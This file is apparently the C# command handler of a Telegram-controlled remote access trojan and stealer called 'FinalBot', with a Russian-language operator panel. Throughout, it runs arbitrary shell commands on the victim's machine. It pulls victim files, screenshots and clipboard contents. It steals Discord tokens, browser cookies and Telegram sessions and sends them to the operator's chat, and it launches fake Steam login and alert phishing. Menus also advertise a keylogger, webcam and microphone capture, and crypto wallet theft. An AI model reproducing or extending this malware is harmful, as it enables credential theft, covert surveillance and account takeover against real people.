using System;
using System.IO;
using System.Threading.Tasks;
using System.IO.Compression;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using TgMessage = Telegram.Bot.Types.Message;
using FinalBot.Stealers;
using FinalBot.Modules;
using System.Linq;
using File = System.IO.File;

namespace FinalBot
{
    public class CommandHandler
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();

        public CommandHandler(ITelegramBotClient botClient, string adminId)
        {
            _botClient = botClient;
            _adminId = adminId;
        }

        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            try
            {
                if (update.Type == UpdateType.Message && update.Message != null)
                {
                    await HandleCommand(update.Message);
                }
                else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
                {
                    await HandleCallbackQuery(update.CallbackQuery);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HANDLER ERROR] {ex.Message}");
                // Ensure bot doesn't crash on one error
            }
        }

        public Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            Console.WriteLine($"[TELEGRAM ERROR] {exception.Message}");
            return Task.CompletedTask;
        }

        public async Task HandleCommand(TgMessage message)
        {
            if (message.From?.Id.ToString() != _adminId) return;

            string text = message.Text ?? "";

            // Handle State-based responses first
            if (_userState.TryGetValue(message.Chat.Id, out string state))
            {
                if (state == "awaiting_agent_name")
                {
                    _phishAgentName = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Agent Name set to:</b> <code>{_phishAgentName}</code>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_phish_cookies")
                {
                    _phishCookies = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Steam Cookies Injected!</b>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_victim_name")
                {
                    ConfigManager.VictimName = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Victim Name set to:</b> <code>{text}</code>", parseMode: ParseMode.Html);
                    return;
                }
            }
            
            if (text.StartsWith("/start") || text.StartsWith("/panel"))
            {
                await ShowAdminPanel(message.Chat.Id);
            }
            else if (text == "/help")
            {
                await ShowHelp(message.Chat.Id);
            }
            else if (text.StartsWith("/shell "))
            {
                string cmd = text.Substring(7).Trim();
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ *Running:* `{cmd}`", parseMode: ParseMode.Markdown);
                string result = await ShellManager.ExecuteCommand(cmd);
                await _botClient.SendTextMessageAsync(message.Chat.Id, result, parseMode: ParseMode.Markdown);
            }
            else if (text.StartsWith("/kill "))
            {
                string pidStr = text.Substring(6).Trim();
                if (int.TryParse(pidStr, out int pid))
                {
                    string res = TaskManager.KillProcess(pid);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
            }
            else if (text.StartsWith("/djoin ") || text.StartsWith("/dstream "))
            {
                var parts = text.Split(' ', 3);
                if (parts.Length == 3)
                {
                    string action = text.StartsWith("/djoin") ? "join" : "stream";
                    string res = DiscordRemoteManager.LaunchDiscordBot(parts[1], parts[2], action);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Use: /djoin <token> <url>");
            }
            else if (text.StartsWith("/get "))
            {
                string path = text.Substring(5).Trim();
                if (System.IO.File.Exists(path))
                {
                    using var stream = System.IO.File.OpenRead(path);
                    await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(path)));
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ File not found.");
            }
            else if (text.StartsWith("/setname "))
            {
                string newName = text.Substring(9).Trim();
                ConfigManager.VictimName = newName;
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ **Victim name updated to:** `{newName}`");
                await ShowAdminPanel(message.Chat.Id);
            }
            else 
            {
                await _botClient.SendTextMessageAsync(message.Chat.Id, "❔ *Unknown command.* Use /help for available commands.");
            }
        }

        public async Task HandleCallbackQuery(CallbackQuery callbackQuery)
        {
            if (callbackQuery.Message is not { } message) return;
            string data = callbackQuery.Data ?? "";

            Console.WriteLine($"[C2] Callback received: {data}");

            switch (data)
            {
                case "admin_panel":
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
                    break;
                case "back_to_main":
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
                    break;
                case "file_manager":
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
                    await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, fmText, parseMode: ParseMode.Markdown, replyMarkup: fmMarkup);
                    break;
                case "proc_list":
                    string procs = TaskManager.GetProcessList();
                    await _botClient.SendTextMessageAsync(message.Chat.Id, procs, parseMode: ParseMode.Markdown);
                    break;
                case "panel_system":
                    await ShowSystemPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_work":
                    await ShowWorkPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_phishing":
                    await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                    break;
                case "set_victim_name":
                    _userState[message.Chat.Id] = "awaiting_victim_name";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter the new Victim Name:</b>", parseMode: ParseMode.Html);
                    break;
                case "screenshot":
                    await HandleScreenshot(message.Chat.Id);
                    break;
                case "clipboard":
                    await HandleClipboard(message.Chat.Id);
                    break;
                case "system_info":
                    await HandleSystemInfo(message.Chat.Id);
                    break;
                case "work_discord":
                    await HandleDiscordSteal(message.Chat.Id);
                    break;
                case "work_browsers":
                    await HandleBrowserSteal(message.Chat.Id);
                    break;
                case "full_report":
                    await HandleFullReport(message.Chat.Id);
                    break;
                case "phish_steam_login":
                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies);
                    FinalBot.Modules.PhishManager.LaunchSteamLogin();
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Login Launched!");
                    break;
                case "phish_steam_alert":
                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies);
                    FinalBot.Modules.PhishManager.LaunchSteamAlert();
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Alert Launched!");
                    break;
                case "phish_set_agent":
                    _userState[message.Chat.Id] = "awaiting_agent_name";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter Agent Name:</b>", parseMode: ParseMode.Html);
                    break;
                case "phish_set_cookies":
                    _userState[message.Chat.Id] = "awaiting_phish_cookies";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Paste Cookies (JSON/Base64):</b>", parseMode: ParseMode.Html);
                    break;
                case "discord_remote_start":
                    await ShowDiscordRemoteMenu(message.Chat.Id, message.MessageId);
                    break;
                case "discord_remote_launch":
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Starting Remote Controller...");
                    PhishManager.LaunchDiscordRemote();
                    break;
                case "work_telegram":
                    await HandleTelegramSteal(message.Chat.Id);
                    break;
                default:
                    if (data.StartsWith("fmd_"))
                    {
                        string pathInfo = data.Substring(4);
                        string realPath;
                        bool isNumeric = int.TryParse(pathInfo, out int pathId);
                        if (!isNumeric)
                        {
                            try { realPath = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(pathInfo)); }
                            catch { realPath = ""; }
                        }
                        else
                        {
                            realPath = PathCache.Get(pathId) ?? "";
                        }
                        var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                        await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
                    }
                    else if (data.StartsWith("fmf_"))
                    {
                        int id = int.Parse(data.Substring(4));
                        string realPath = PathCache.Get(id);
                    if (!string.IsNullOrEmpty(realPath) && System.IO.File.Exists(realPath))
                    {
                        var info = new FileInfo(realPath);
                        string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
                        string ext = info.Extension.ToUpper().Replace(".", "");
                        string caption = $"📄 <b>FILE INFORMATION</b>\n" +
                                         $"━━━━━━━━━━━━━━━━━━\n" +
                                         $"📂 <b>Name:</b> <code>{info.Name}</code>\n" +
                                         $"🏗️ <b>Format:</b> <code>{ext}</code>\n" +
                                         $"⚖️ <b>Size:</b> <code>{size}</code>\n" +
                                         $"📅 <b>Created:</b> <code>{info.CreationTime:yyyy-MM-dd HH:mm}</code>\n" +
                                         $"📝 <b>Modified:</b> <code>{info.LastWriteTime:yyyy-MM-dd HH:mm}</code>\n" +
                                         $"━━━━━━━━━━━━━━━━━━";

                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>Uploading:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
                        using var stream = System.IO.File.OpenRead(realPath);
                        await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
                    }
                    }
                    else if (data.StartsWith("fmp_"))
                    {
                        var parts = data.Substring(4).Split('_');
                        int parentId = int.Parse(parts[0]);
                        int page = int.Parse(parts[1]);
                        string realPath = PathCache.Get(parentId) ?? "";
                        var (view, keyMarkup) = FileManager.GetDirectoryView(realPath, page);
                        await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
                    }
                    else
                    {
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "Feature not yet implemented in C#.");
                    }
                    break;
            }
        }

        private async Task HandleScreenshot(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "📸 *Capturing screen...*");
            string? path = ScreenshotModule.TakeScreenshot();
            if (path != null)
            {
                using var stream = System.IO.File.OpenRead(path);
                await _botClient.SendPhotoAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(path)));
                System.IO.File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Failed to take screenshot.");
        }

        private async Task HandleClipboard(long chatId)
        {
            string text = ClipboardModule.GetClipboardText();
            if (!string.IsNullOrEmpty(text))
            {
                await _botClient.SendTextMessageAsync(chatId, $"📋 *Clipboard:* \n`{text}`", parseMode: ParseMode.Markdown);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Clipboard is empty.");
        }

        private async Task HandleSystemInfo(long chatId)
        {
            string info = SystemInfoModule.GetSystemInfo();
            await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown);
        }

        private async Task HandleDiscordSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "💬 <i>Scanning Discord...</i>", parseMode: ParseMode.Html);
            var stealer = new DiscordStealer();
            string report = await stealer.Run();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
        }

        private async Task HandleBrowserSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>Scanning Browsers...</i>", parseMode: ParseMode.Html);
            var stealer = new BrowserStealer();
            string report = await stealer.RunAll();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
        }

        private async Task HandleTelegramSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "✈️ *Scanning Telegram Desktop...*");
            var stealer = new TelegramStealer();
            string result = stealer.Run();
            if (result.StartsWith("❌"))
            {
                await _botClient.SendTextMessageAsync(chatId, result);
            }
            else
            {
                // Result is the path to the temporary folder with sessions
                await _botClient.SendTextMessageAsync(chatId, "✅ *Sessions collected.* Preparing archive...");
                
                string zipPath = Path.Combine(Path.GetTempPath(), "TG_Session.zip");
                if (System.IO.File.Exists(zipPath)) System.IO.File.Delete(zipPath);
                
                System.IO.Compression.ZipFile.CreateFromDirectory(result, zipPath);
                
                using (var stream = System.IO.File.OpenRead(zipPath))
                {
                    await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Telegram_Sessions.zip"));
                }
                
                System.IO.File.Delete(zipPath);
                Directory.Delete(result, true);
            }
        }


        private async Task HandleFullReport(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🚀 *Generating full report...*");
            string? zipPath = await ReportManager.CreateFullReport();
            if (zipPath != null)
            {
                using var stream = System.IO.File.OpenRead(zipPath);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 Full Stolen Data Report (C#)");
                System.IO.File.Delete(zipPath);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Failed to generate report.");
        }

        private async Task ShowAdminPanel(long chatId, int messageId = 0)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💻 System", "panel_system"),
                    InlineKeyboardButton.WithCallbackData("💼 Work", "panel_work"),
                    InlineKeyboardButton.WithCallbackData("👁️ Spyware", "panel_spyware")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("✍️ Set Name", "set_victim_name")
                }
            });

            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
            string externalIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
            string victimName = ConfigManager.VictimName; // Assuming we have such property
            
            string info = $"🎮 **ПАНИЛЬ УПРАВЛЕНИЯ**\n" +
                          $"👤 **Клиентов:** 1\n" +
                          $"🖥️ **Текущий:** `{Environment.UserName}@{Environment.MachineName}`\n" +
                          $"⚡ **Статус:** {adminStatus}\n" +
                          $"💻 **ПК:** `{Environment.MachineName}` | 👤 **Юзер:** `{Environment.UserName}`\n" +
                          $"🌐 **IP:** `{externalIp}`\n" +
                          $"📂 **Папка:** `{AppDomain.CurrentDomain.BaseDirectory}`\n" +
                          $"⌛ **Время:** `{DateTime.Now:yyyy-MM-dd HH:mm:ss}`\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"💻 **SYSTEM** (Сеть, Файлы, Процессы, Терминал, Настройки)\n" +
                          $"💼 **WORK** (Стиллеры, Куки, Инжекты, Discord Remote)\n" +
                          $"👁️ **SPYWARE** (Микро, Камера, Скрины, Видео, Кейлоггер)\n\n" +
                          $"💡 Просмотр всех функций: /help или кнопка '🆘 Справка'";

            if (messageId > 0)
            {
                await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
            }
            else
            {
                await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
            }
        }

        private async Task ShowSystemPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📂 File Manager", "file_manager"),
                    InlineKeyboardButton.WithCallbackData("📋 Clipboard", "clipboard")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⚙️ Sys Info", "system_info"),
                    InlineKeyboardButton.WithCallbackData("📶 WiFi Data", "wifi_info")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📡 Shell Terminal", "system_shell"),
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
                }
            });

            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 **SYSTEM PANEL**\nNetwork, Files, Processes, Terminal...", parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowWorkPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎮 Discord", "work_discord"),
                    InlineKeyboardButton.WithCallbackData("✈️ Telegram", "work_telegram")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🍪 Cookies", "work_browsers"),
                    InlineKeyboardButton.WithCallbackData("💰 Crypto", "work_crypto")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎭 Phishing", "panel_phishing")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
                }
            });

            string info = "💼 <b>WORK PANEL</b>\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          "🛡️ <b>Stealers:</b> Discord, Telegram, Browsers, Wallets\n" +
                          "🎭 <b>Phishing:</b> Steam Alerts, Fake Logins\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          "Select a module to continue:";

            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
        }

        private string _phishAgentName = "Valve_Security_Specialist_732";
        private string _phishCookies = "";

        private async Task ShowPhishingPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📢 Steam Alert", "phish_steam_alert"),
                    InlineKeyboardButton.WithCallbackData("🔑 Steam Login", "phish_steam_login")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("👤 Set Agent", "phish_set_agent"),
                    InlineKeyboardButton.WithCallbackData("🍪 Inject Cookies", "phish_set_cookies")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔙 Back", "panel_work")
                }
            });

            string statusText = string.IsNullOrEmpty(_phishCookies) ? "❌ Not Set" : "✅ Loaded";
            string info = "🎭 <b>PHISHING CENTER</b>\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          $"🕵️ <b>Agent:</b> <code>{_phishAgentName}</code>\n" +
                          $"🍪 <b>Cookies:</b> {statusText}\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          "1️⃣ <b>Set Agent:</b> Change the name displayed in the alert.\n" +
                          "2️⃣ <b>Inject Cookies:</b> Paste base64 or JSON cookies.\n" +
                          "3️⃣ <b>Launch:</b> Start the phishing process on victim PC.";

            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
        }

        private async Task ShowSpywarePanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📸 Screenshot", "screenshot"),
                    InlineKeyboardButton.WithCallbackData("🎥 Screen Video", "record_video")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎤 Record Mic", "record_audio"),
                    InlineKeyboardButton.WithCallbackData("📹 Webcam Pic", "webcam")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎮 Join Discord", "discord_remote_start"),
                    InlineKeyboardButton.WithCallbackData("⌨️ Keylogger", "keylogger_menu")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
                }
            });

            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ **SPYWARE PANEL**\nReal-time monitoring and control:", parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowDiscordRemoteMenu(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🚀 Launch Controller", "discord_remote_launch"),
                    InlineKeyboardButton.WithCallbackData("📊 Sessions: 1", "discord_sessions")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔑 Active Token: N/A", "discord_set_token")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔙 Back to Spyware", "panel_spyware")
                }
            });

            string info = "🎮 **DISCORD REMOTE CONTROL**\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          "🤖 **Status:** Ready\n" +
                          "👥 **Managed Users:** 0\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          "This module uses Selenium to take over Discord sessions. Requires Python and Chrome.";

            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowHelp(long chatId)
        {
            string help = "🆘 AVAILABLE COMMANDS\n\n" +
                          "/panel - Open admin panel\n" +
                          "/help - Show this help\n" +
                          "/send <path> - Download file from target\n";

            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Markdown);
        }
    }
}
